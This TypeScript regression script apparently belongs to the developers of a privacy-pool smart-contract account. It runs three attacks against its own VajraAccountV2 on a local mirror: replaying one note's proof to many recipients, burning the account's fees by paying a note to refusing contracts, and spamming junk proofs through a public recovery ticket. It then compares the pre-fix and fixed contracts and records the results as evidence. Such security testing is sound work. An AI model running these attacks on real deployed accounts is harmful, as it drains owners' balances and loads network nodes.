/**
 * What a proof transaction can be made to cost, with no signature to stop it. This runs on the mirror only.
 *
 * 1. One note, proved to many recipients. With the recipient in the nonce key, each proof is a transaction of its own, all pending
 *    at once, each counted as seen against the account and owed out of its balance.
 * 2. A note paid to a contract that refuses the money. The frame reverted, the note lived on, and the account paid the fee, so
 *    a note's holder could burn the owner's balance for as long as they cared to, with a new contract each time.
 * 3. A ticket that went public with a recovery, kept open, so that anyone could have a node run a pairing on a proof that cannot pass.
 *
 *     vajra proof-spam         VajraAccountV2 before the fix: artifacts/VajraAccountV2.pre-fix.json
 *     vajra proof-spam fixed   VajraAccountV2 as it is now
 */
import { writeFileSync } from "node:fs";
import { type Address, type Hex, formatEther, keccak256, parseEther, toHex } from "viem";
import { generatePrivateKey, privateKeyToAccount } from "viem/accounts";
import {
  DEVNET,
  type FrameTx,
  LEGACY_GAS_PRICE,
  RpcError,
  accountState,
  accountV2Abi,
  deployments,
  framesSucceeded,
  isLocalStack,
  opsV2,
  preFixUnshieldNonceKey,
  publicClient,
  recoveryGate,
  recoveryTicket,
  recoveryTx,
  refusalNameV2,
  sendAlt,
  sleep,
  submit,
  unshieldNonceKey,
  unshieldTx,
  waitForSuccess,
  walletFor,
} from "@vajra/core";
import { loadOrCreateKey } from "@vajra/core/node";
import { keyPath } from "./deploy.ts";
import { type Note, newNote, noteCommitment, proveRecovery, proveUnshield, randomFieldElement, recoveryCommitment, stopProver } from "./proving.ts";
import { denomination, poolLeaves, readPool } from "./shield.ts";
import { deployRefuser, master, newAccount, newSigner, preFixV2Factory, reputationOf } from "./zk-run.ts";

if (!isLocalStack) throw new Error("this is an attack: it runs on the local mirror only, with VAJRA_STACK=local");

const fixed = process.argv.includes("fixed");
const COPIES = 6;
const BURNS = 3;
const deployer = loadOrCreateKey(keyPath("deployer.key"));
const { v2 } = deployments();
const fresh = () => privateKeyToAccount(generatePrivateKey()).address;
const DENOM = denomination();
const chainId = DEVNET.chainId;
const signer = newSigner();
const factory = fixed ? v2!.factory : await preFixV2Factory(deployer);
const account = await newAccount(deployer, signer, fresh(), fresh(), keccak256(toHex("harbor")), parseEther("2"), factory);
const { epochSalt } = await accountState(account);
const label = fixed ? "VajraAccountV2" : "VajraAccountV2 before the fix";
console.log(`${label}: ${account}`);

const keyFor = (nullifierHash: bigint, recipient: Address) => (fixed ? unshieldNonceKey(nullifierHash) : preFixUnshieldNonceKey(nullifierHash, recipient));
const outcome = (error: Error) => (error instanceof RpcError ? refusalNameV2(error.message) : error.message).slice(0, 120);

/** An outsider's deposit: an ordinary transaction, which is all it takes to hold a note in someone's pool. */
async function outsiderNote(): Promise<{ note: Note; leaf: number }> {
  const note = newNote();
  const commitment = await noteCommitment(note);
  await waitForSuccess(
    await walletFor(deployer).writeContract({ address: account, abi: accountV2Abi as never, functionName: "shield", args: [commitment], value: DENOM, gas: 8_000_000n, gasPrice: LEGACY_GAS_PRICE, type: "legacy", chain: undefined } as never),
    "an outsider's deposit",
  );
  const leaves = await poolLeaves(account);
  return { note, leaf: leaves.indexOf(commitment) };
}

async function proofTo(note: Note, leaf: number, recipient: Address, fees?: { maxFeePerGas: bigint; maxPriorityFeePerGas: bigint }): Promise<FrameTx> {
  const leaves = await poolLeaves(account);
  const proved = await proveUnshield({ note, leaves, leaf, recipient, denomination: DENOM, account, chainId });
  return unshieldTx({ account, root: proved.root, nullifierHash: proved.nullifierHash, recipient, proof: proved.proof, nonceKey: keyFor(proved.nullifierHash, recipient), fees });
}

await submit(master(signer, account, epochSalt, [opsV2.shield(await noteCommitment(newNote()), DENOM)]));

console.log(`\n1. One note, ${COPIES} proofs, ${COPIES} recipients`);
const one = await outsiderNote();
const copies: FrameTx[] = [];
for (let i = 0; i < COPIES; i++) copies.push(await proofTo(one.note, one.leaf, fresh()));
const seenBefore = (await reputationOf(account)).opsSeen;
let pendingAtOnce = 0;
const refusalsSeen: string[] = [];
for (const tx of copies) {
  await sendAlt(tx).then(
    () => pendingAtOnce++,
    (error: Error) => refusalsSeen.push(outcome(error)),
  );
}
const seenAfter = (await reputationOf(account)).opsSeen;
console.log(`  ${pendingAtOnce} of ${COPIES} admitted, all valid at once. Counted as seen: ${seenAfter - seenBefore}`);
if (refusalsSeen.length) console.log(`  the rest: ${[...new Set(refusalsSeen)].join("; ")}`);
await sleep(6000);

console.log(`\n2. One note, paid to contracts that refuse it, at the highest fee the cap allows`);
const burner = await outsiderNote();
const fees = { maxFeePerGas: 3_000_000_000n, maxPriorityFeePerGas: 3_000_000_000n };
const before = await publicClient.getBalance({ address: account });
const heldBefore = await readPool<bigint>(account, "poolHeld");
let attempts = 0;
let burnRefusal: string | null = null;
for (let i = 0; i < BURNS; i++) {
  const refuser = await deployRefuser(deployer);
  const tx = await proofTo(burner.note, burner.leaf, refuser, fees);
  const sent = await submit(tx).catch((error: Error) => {
    burnRefusal = outcome(error);
    return null;
  });
  if (!sent) break;
  attempts++;
  console.log(`  attempt ${attempts}: mined, all frames ok: ${framesSucceeded(sent.receipt)}, ${Number(BigInt(sent.receipt.gasUsed))} gas`);
}
const after = await publicClient.getBalance({ address: account });
const heldAfter = await readPool<bigint>(account, "poolHeld");
const noteLives = heldAfter === heldBefore;
// What the account lost that the notes were not owed. A note that was spent left its value behind, and its fee came out of that.
const burned = before - after;
console.log(`  ${attempts} mined${burnRefusal ? `, then ${burnRefusal}` : ""}. The account's balance fell by ${formatEther(burned)} ETH, the notes it owes by ${formatEther(heldBefore - heldAfter)}. The note ${noteLives ? "is still good" : "is spent"}`);

console.log("\n3. A ticket after a recovery has used it");
const paper = randomFieldElement();
const ticket = recoveryTicket(paper);
await submit(master(signer, account, epochSalt, [opsV2.setRecovery(await recoveryCommitment(paper), 60n, recoveryGate(ticket))]));
const newRoot = newSigner().root;
const proved = await proveRecovery({ secret: paper, newRoot, account, epochSalt, chainId });
await submit(recoveryTx({ account, newRoot, nullifier: proved.nullifier, proof: proved.proof, ticket }));
const junk = () => recoveryTx({ account, newRoot: keccak256(toHex(`junk ${Math.random()}`)) as Hex, nullifier: randomFieldElement(), proof: proved.proof, ticket });
const startedAt = Date.now();
const names = new Set<string>();
const TRIES = 10;
for (let i = 0; i < TRIES; i++) {
  await sendAlt(junk()).then(
    () => names.add("ADMITTED"),
    (error: Error) => names.add(outcome(error)),
  );
}
const perTry = Math.round((Date.now() - startedAt) / TRIES);
console.log(`  ${TRIES} junk proofs with the public ticket: ${[...names].join(", ")}, ${perTry} ms each`);

writeFileSync(
  new URL(`../../../docs/evidence/proof-spam-${fixed ? "fixed" : "pre-fix"}-latest.json`, import.meta.url),
  JSON.stringify(
    {
      ranAt: new Date().toISOString(),
      stack: "local mirror: ethrex 9aa3645 + sidecar 2e22ff0 with sidecar-budget-010.patch. NOT run on the public devnet",
      chainId,
      contract: label,
      account,
      copies: { proofs: COPIES, pendingAtOnce, seen: seenAfter - seenBefore, refusals: [...new Set(refusalsSeen)] },
      refusingRecipient: { mined: attempts, refusal: burnRefusal, accountBalanceFell: burned.toString(), noteStillGood: noteLives },
      usedTicket: { tries: TRIES, refusals: [...names], msPerTry: perTry },
    },
    null,
    1,
  ) + "\n",
);
await stopProver();
process.exit(0);
